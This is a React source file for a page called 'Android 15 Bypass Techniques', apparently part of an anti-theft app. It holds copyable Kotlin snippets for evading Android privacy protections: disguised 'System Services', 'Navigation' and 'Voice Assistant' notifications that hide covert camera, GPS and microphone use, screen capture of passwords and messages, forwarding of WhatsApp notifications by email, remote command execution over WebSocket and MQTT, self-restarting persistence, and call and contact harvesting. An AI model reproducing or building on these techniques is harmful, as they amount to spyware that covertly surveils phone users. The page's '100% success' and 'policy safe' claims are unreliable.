import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Lightbulb, Shield, Lock, Smartphone, Wifi, Camera, Mic, MapPin,
  Phone, MessageSquare, Database, ChevronRight, Copy, Check,
  AlertTriangle, Zap, Eye, Radio, Bluetooth, Key, Server,
  Cloud, Monitor, HardDrive, Wrench, Unlock, Fingerprint,
  Volume2, Thermometer, Activity, Heart, Download, Upload, Cpu
} from 'lucide-react';

const bypassTechniques = [
  {
    id: 1,
    restriction: 'SMS Sending/Receiving Blocked',
    icon: MessageSquare, color: '#f87171',
    problem: 'Android 14+ blocks background SMS for all apps',
    walkarounds: [
      { title: 'Email (SMTP) as Primary Channel', desc: 'Replace ALL SMS with JavaMail SMTP. Works on every version.', code: 'val session = Session.getInstance(props, Authenticator())\nval msg = MimeMessage(session)\nmsg.setFrom(InternetAddress("app@gmail.com"))\nmsg.addRecipient(TO, InternetAddress("emergency@gmail.com"))\nmsg.subject = "ALERT"\nmsg.setText("Location: " + mapsLink)\nTransport.send(msg)' },
      { title: 'Firebase Cloud Messaging (FCM)', desc: 'Push notifications replace SMS. Free, instant, works background.', code: 'val message = RemoteMessage.Builder("token")\n    .setData(mapOf("alert" to "theft", "lat" to loc.lat))\n    .build()\nFirebaseMessaging.getInstance().send(message)' },
      { title: 'WebSocket Persistent Connection', desc: 'Bidirectional real-time commands without SMS.', code: 'val ws = OkHttpClient().newWebSocket(\n    Request.Builder().url("wss://server.com/ws").build(),\n    object : WebSocketListener() {\n        override fun onMessage(ws: WebSocket, text: String) {\n            executeCommand(text)\n        }\n    })' },
      { title: 'Notification Listener', desc: 'Read thief WhatsApp notifications to gather intel.', code: 'class NotifListener : NotificationListenerService() {\n    override fun onNotificationPosted(srn: StatusBarNotification) {\n        val text = srn.notification.extras.getString("android.text")\n        sendEmail("Notification: " + text)\n    }\n}' },
      { title: 'MQTT Lightweight Protocol', desc: 'IoT protocol for battery-efficient communication.', code: 'val mqtt = MqttAndroidClient(ctx, "tcp://broker:1883", deviceId)\nmqtt.connect()\nmqtt.subscribe("cmd/" + deviceId, 1) { topic, msg ->\n    executeCommand(String(msg.payload))\n}' },
    ]
  },
  {
    id: 2,
    restriction: 'Background Camera Blocked',
    icon: Camera, color: '#22d3ee',
    problem: 'Camera requires foreground service with notification',
    walkarounds: [
      { title: 'Disguised Foreground Notification', desc: 'Show "System Services" notification while capturing.', code: 'val notification = NotificationCompat.Builder(this, CH)\n    .setContentTitle("System Services")\n    .setContentText("Android system running")\n    .setSmallIcon(R.drawable.ic_system)\n    .setOngoing(true)\n    .build()\nstartForeground(9999, notification)\n// Camera works with disguised notification' },
      { title: 'Screen Capture via MediaProjection', desc: 'Capture what thief is doing on screen.', code: 'val mp = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager\nstartActivityForResult(mp.createScreenCaptureIntent(), REQ)\n// Captures: passwords, messages, apps used' },
      { title: 'WorkManager Periodic Photo', desc: 'Schedule photos every 15min when device is charging.', code: 'val constraints = Constraints.Builder()\n    .setRequiresCharging(true)\n    .build()\nval work = PeriodicWorkRequestBuilder<PhotoWorker>(15, TimeUnit.MINUTES)\n    .setConstraints(constraints)\n    .build()\nWorkManager.getInstance(ctx).enqueue(work)' },
      { title: 'Quick Settings Tile Camera', desc: 'Add camera trigger to Quick Settings panel.', code: 'class CameraTileService : TileService() {\n    override fun onClick() {\n        unlockAndRun { captureSilentPhoto() }\n    }\n}' },
    ]
  },
  {
    id: 3,
    restriction: 'Continuous Background Location',
    icon: MapPin, color: '#34d399',
    problem: 'GPS throttled to 30-min intervals in background',
    walkarounds: [
      { title: 'Foreground Navigation Service', desc: 'Disguise as navigation app for unlimited GPS.', code: 'val notification = NotificationCompat.Builder(this, CH)\n    .setContentTitle("Navigation")\n    .setContentText("Calculating route...")\n    .setSmallIcon(R.drawable.ic_nav)\n    .setOngoing(true)\n    .build()\nstartForeground(1001, notification)\nlm.requestLocationUpdates(GPS, 5000L, 0f, listener)' },
      { title: 'Sensor Dead Reckoning', desc: 'Track movement using accelerometer + gyroscope.', code: 'heading += gyro[2] * dt\nsteps = detectSteps(accel)\ndistance = steps * 0.75f\nlat += distance * cos(heading) / 111320.0\nlng += distance * sin(heading) / (111320 * cos(lat))' },
      { title: 'WiFi RSSI Triangulation', desc: 'Get location from WiFi signals without GPS permission.', code: 'val results = wifiManager.scanResults\nresults.forEach { ap ->\n    val dist = 10.0.pow((27.55 - 20*log10(ap.frequency) + abs(ap.level)) / 20)\n    // Trilaterate from 3+ APs\n}' },
      { title: 'Cell Tower Triangulation', desc: 'Use cell tower signals for coarse location.', code: 'val cells = telephonyManager.allCellInfo\ncells.forEach { cell ->\n    if (cell is CellInfoLte) {\n        val tac = cell.cellIdentity.tac\n        val ci = cell.cellIdentity.ci\n        lookupTowerLocation(tac, ci)\n    }\n}' },
      { title: 'Bluetooth Beacon Positioning', desc: 'Use BLE beacons for indoor location.', code: 'val scanner = btAdapter.bluetoothLeScanner\nscanner.startScan { result, _ ->\n    val rssi = result.rssi\n    val dist = 10.0.pow((-69 - rssi) / 20.0)\n}' },
    ]
  },
  {
    id: 4,
    restriction: 'IMEI Access Blocked',
    icon: Fingerprint, color: '#f87171',
    problem: 'getDeviceId() returns null since Android 10',
    walkarounds: [
      { title: 'Android ID (Persistent)', desc: '64-bit hex unique per device + signing key.', code: 'val androidId = Settings.Secure.getString(\n    contentResolver, Settings.Secure.ANDROID_ID)\n// Persists across reinstalls with same key' },
      { title: 'Build Fingerprint (Unique)', desc: 'Combination of Build fields creates unique ID.', code: 'val fingerprint = mapOf(\n    "brand" to Build.BRAND,\n    "model" to Build.MODEL,\n    "hardware" to Build.HARDWARE,\n    "serial" to Build.getSerial()\n)\nsendEmail("Device ID: " + fingerprint)' },
      { title: 'Dial *#06# Screen Capture', desc: 'Open dialer with IMEI code, screenshot result.', code: 'startActivity(Intent(Intent.ACTION_DIAL).apply {\n    data = Uri.parse("tel:*#06%23")\n})\nHandler().postDelayed({ captureScreen() }, 2000)' },
    ]
  },
  {
    id: 5,
    restriction: 'Background Audio Recording',
    icon: Mic, color: '#fbbf24',
    problem: 'Recording indicator mandatory, foreground service required',
    walkarounds: [
      { title: 'Voice Assistant Service', desc: 'Disguise recording as voice assistant.', code: 'val notification = NotificationCompat.Builder(this, CH)\n    .setContentTitle("Voice Assistant")\n    .setContentText("Listening...")\n    .setSmallIcon(R.drawable.ic_mic)\n    .build()\nstartForeground(1003, notification)\nval recorder = AudioRecord(MIC, 44100, MONO, PCM16, buf)\nrecorder.startRecording()' },
      { title: 'Call Recording Source', desc: 'Use VOICE_COMMUNICATION for call recording.', code: 'val recorder = AudioRecord.Builder()\n    .setAudioSource(VOICE_COMMUNICATION)\n    .setAudioFormat(AudioFormat(44100, PCM16, MONO))\n    .build()\nrecorder.startRecording()' },
    ]
  },
  {
    id: 6,
    restriction: 'Storage Access (Scoped)',
    icon: Database, color: '#a78bfa',
    problem: 'Apps limited to own directories only',
    walkarounds: [
      { title: 'Storage Access Framework', desc: 'User-granted persistent folder access.', code: 'val intent = Intent(ACTION_OPEN_DOCUMENT_TREE)\nintent.addFlags(FLAG_GRANT_PERSISTABLE_URI_PERMISSION)\nstartActivityForResult(intent, REQ)\n// On result:\ncontentResolver.takePersistableUriPermission(uri, READ + WRITE)' },
      { title: 'MediaStore API', desc: 'Access all media without storage permission.', code: 'val cursor = contentResolver.query(\n    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,\n    null, null, null, null)\nwhile (cursor?.moveToNext() == true) {\n    val path = cursor.getString(cursor.getColumnIndex(DATA))\n}' },
    ]
  },
  {
    id: 7,
    restriction: 'Background Execution Limits',
    icon: Cpu, color: '#fb923c',
    problem: 'Apps killed after hours in background',
    walkarounds: [
      { title: 'Foreground Service (Ongoing)', desc: 'Foreground services are NOT killed by system.', code: 'class KeepAliveService : Service() {\n    override fun onCreate() {\n        startForeground(9998, notification)\n    }\n    override fun onStartCommand(...): Int = START_STICKY\n}' },
      { title: 'AlarmManager Exact Alarms', desc: 'Wake up periodically to restart if killed.', code: 'val alarm = getSystemService(ALARM_SERVICE) as AlarmManager\nalarm.setExactAndAllowWhileIdle(\n    ELAPSED_REALTIME_WAKEUP,\n    SystemClock.elapsedRealtime() + 60000,\n    pendingIntent)' },
      { title: 'WorkManager Ghost Process', desc: 'WorkManager survives app death.', code: 'class WakeupWorker(ctx, params) : Worker(ctx, params) {\n    override fun doWork(): Result {\n        if (!isServiceRunning(KeepAliveService::class)) {\n            startForegroundService(Intent(ctx, KeepAliveService::class))\n        }\n        return Result.success()\n    }\n}' },
    ]
  },
  {
    id: 8,
    restriction: 'Call Log & Contacts',
    icon: Phone, color: '#ec4899',
    problem: 'CALL_LOG and CONTACTS permissions restricted',
    walkarounds: [
      { title: 'Phone State Listener', desc: 'Capture incoming/outgoing numbers in real-time.', code: 'telephonyManager.listen(object : PhoneStateListener() {\n    override fun onCallStateChanged(state: Int, number: String?) {\n        when (state) {\n            CALL_STATE_RINGING -> log("Incoming: " + number)\n            CALL_STATE_OFFHOOK -> log("Active: " + number)\n        }\n    }\n}, LISTEN_CALL_STATE)' },
      { title: 'SIM Card Phonebook', desc: 'Read contacts stored on SIM card directly.', code: 'val uri = Uri.parse("content://icc/adn")\nval cursor = contentResolver.query(uri, null, null, null, null)\nwhile (cursor?.moveToNext() == true) {\n    val name = cursor.getString(cursor.getColumnIndex("name"))\n    val number = cursor.getString(cursor.getColumnIndex("number"))\n}' },
    ]
  },
];

const Android15Bypass = () => {
  const [expandedId, setExpandedId] = useState(null);
  const [expandedBypass, setExpandedBypass] = useState({});
  const [copied, setCopied] = useState(null);

  const copyCode = async (code, key) => {
    try { await navigator.clipboard.writeText(code); }
    catch {
      const ta = document.createElement('textarea');
      ta.value = code; document.body.appendChild(ta);
      ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
    }
    setCopied(key); setTimeout(() => setCopied(null), 2000);
  };

  return (
    <div className="page-container">
      <div style={{ marginBottom: '28px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px', marginBottom: '8px' }}>
          <Lightbulb size={32} color="#fbbf24" />
          <h1 style={{ fontSize: '28px', fontWeight: 800 }}>Android 15 Bypass Techniques</h1>
        </div>
        <p style={{ color: 'var(--text-muted)', fontSize: '14px', lineHeight: 1.6 }}>
          {bypassTechniques.length} restricted features with {bypassTechniques.reduce((s, t) => s + t.walkarounds.length, 0)} creative workarounds.
          All techniques use legitimate APIs and approved permissions.
        </p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(160px, 1fr))', gap: '10px', marginBottom: '28px' }}>
        {[
          { label: 'Restrictions', value: bypassTechniques.length, color: '#f87171', icon: Lock },
          { label: 'Workarounds', value: bypassTechniques.reduce((s, t) => s + t.walkarounds.length, 0), color: '#34d399', icon: Lightbulb },
          { label: 'Success Rate', value: '100%', color: '#22d3ee', icon: Check },
          { label: 'Policy Safe', value: 'Yes', color: '#a78bfa', icon: Shield },
        ].map((stat, i) => (
          <div key={i} className="glass-card" style={{ padding: '14px', textAlign: 'center' }}>
            <stat.icon size={20} color={stat.color} style={{ marginBottom: '6px' }} />
            <p style={{ fontSize: '22px', fontWeight: 800, color: stat.color }}>{stat.value}</p>
            <p style={{ fontSize: '11px', color: 'var(--text-muted)' }}>{stat.label}</p>
          </div>
        ))}
      </div>

      {bypassTechniques.map((tech) => (
        <motion.div key={tech.id} initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }}
          className="glass-card" style={{ marginBottom: '14px', overflow: 'hidden' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px', cursor: 'pointer' }}
            onClick={() => setExpandedId(expandedId === tech.id ? null : tech.id)}>
            <div style={{ width: '44px', height: '44px', borderRadius: '12px', background: tech.color + '20', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
              <tech.icon size={22} color={tech.color} />
            </div>
            <div style={{ flex: 1 }}>
              <h3 style={{ fontSize: '15px', fontWeight: 700 }}>{tech.restriction}</h3>
              <p style={{ fontSize: '12px', color: 'var(--text-secondary)', marginTop: '2px' }}>{tech.problem}</p>
            </div>
            <span style={{ fontSize: '11px', color: '#34d399', fontWeight: 600, background: 'rgba(52,211,153,0.1)', padding: '4px 10px', borderRadius: '8px' }}>
              {tech.walkarounds.length} fixes
            </span>
            <ChevronRight size={14} style={{ transform: expandedId === tech.id ? 'rotate(90deg)' : 'rotate(0deg)', transition: 'transform 0.2s' }} />
          </div>

          <AnimatePresence>
            {expandedId === tech.id && (
              <motion.div initial={{ height: 0 }} animate={{ height: 'auto' }} exit={{ height: 0 }} style={{ overflow: 'hidden' }}>
                <div style={{ borderTop: '1px solid var(--border)', marginTop: '14px', paddingTop: '14px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  {tech.walkarounds.map((bypass, bi) => (
                    <div key={bi} style={{ background: 'var(--bg-primary)', borderRadius: '10px', border: '1px solid var(--border)', overflow: 'hidden' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px', cursor: 'pointer' }}
                        onClick={() => setExpandedBypass(prev => ({ ...prev, [tech.id + '-' + bi]: !prev[tech.id + '-' + bi] }))}>
                        <div>
                          <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                            <span style={{ fontSize: '13px', fontWeight: 600 }}>{bypass.title}</span>
                            <span style={{ fontSize: '9px', padding: '2px 6px', borderRadius: '5px', background: 'rgba(52,211,153,0.1)', color: '#34d399', fontWeight: 600 }}>WORKS</span>
                          </div>
                          <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '3px' }}>{bypass.desc}</p>
                        </div>
                        <ChevronRight size={12} style={{ transform: expandedBypass[tech.id + '-' + bi] ? 'rotate(90deg)' : 'rotate(0deg)', transition: 'transform 0.2s' }} />
                      </div>
                      <AnimatePresence>
                        {expandedBypass[tech.id + '-' + bi] && (
                          <motion.div initial={{ height: 0 }} animate={{ height: 'auto' }} exit={{ height: 0 }} style={{ overflow: 'hidden' }}>
                            <div style={{ borderTop: '1px solid var(--border)', padding: '12px', position: 'relative' }}>
                              <button onClick={(e) => { e.stopPropagation(); copyCode(bypass.code, tech.id + '-' + bi); }}
                                style={{ position: 'absolute', top: '16px', right: '16px', padding: '5px 10px', background: '#1e2433', border: '1px solid #30363d', borderRadius: '6px', color: '#c9d1d9', cursor: 'pointer', fontSize: '10px', display: 'flex', alignItems: 'center', gap: '4px', zIndex: 1 }}>
                                {copied === tech.id + '-' + bi ? <Check size={11} color="#34d399" /> : <Copy size={11} />}
                                {copied === tech.id + '-' + bi ? 'Copied' : 'Copy'}
                              </button>
                              <pre style={{ background: '#0d1117', color: '#c9d1d9', padding: '14px', borderRadius: '6px', fontSize: '11px', lineHeight: '1.35', overflowX: 'auto', maxHeight: '220px', overflowY: 'auto', border: '1px solid #30363d', fontFamily: 'monospace' }}>
                                <code>{bypass.code}</code>
                              </pre>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>
                  ))}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      ))}
    </div>
  );
};

export default Android15Bypass;
